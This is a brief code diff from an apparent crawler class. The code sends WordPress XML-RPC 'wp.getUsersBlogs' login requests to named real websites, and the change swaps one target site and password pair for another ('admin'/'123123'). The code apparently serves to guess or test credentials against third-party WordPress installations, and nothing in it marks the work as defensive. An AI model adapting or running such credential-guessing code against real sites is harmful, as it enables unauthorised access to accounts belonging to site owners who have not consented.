@@ -59,9 +59,9 @@ class Cruzer(cocrawler.Crawler):
 
             counter.count()
 
-            url = 'http://safina.by/blog/xmlrpc.php'
+            url = 'http://fitness2u.net.au/xmlrpc.php'
             body = """<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>
-        <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % ('safina', 'safpasswordwordpress')
+        <params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % ('admin', '123123')
 
             req = Req(url)
             req.post = body
